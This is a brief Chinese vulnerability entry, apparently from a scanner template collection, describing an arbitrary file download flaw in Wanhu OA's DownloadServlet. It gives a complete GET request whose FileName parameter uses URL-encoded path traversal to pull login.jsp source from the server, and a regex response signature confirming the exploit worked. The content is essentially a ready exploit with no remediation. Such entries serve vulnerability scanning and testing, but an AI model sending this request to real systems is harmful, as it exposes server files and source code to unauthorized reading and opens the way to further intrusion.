# 万户OADownloadServlet存在任意文件下载漏洞

万户 ｜ 其他 ｜ —
- **请求**：`GET /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2 HTTP/1.1`
- **响应特征**：-1 ^(?=.*?request.getParameter)(?=.*?logoindexpicaccName).*?$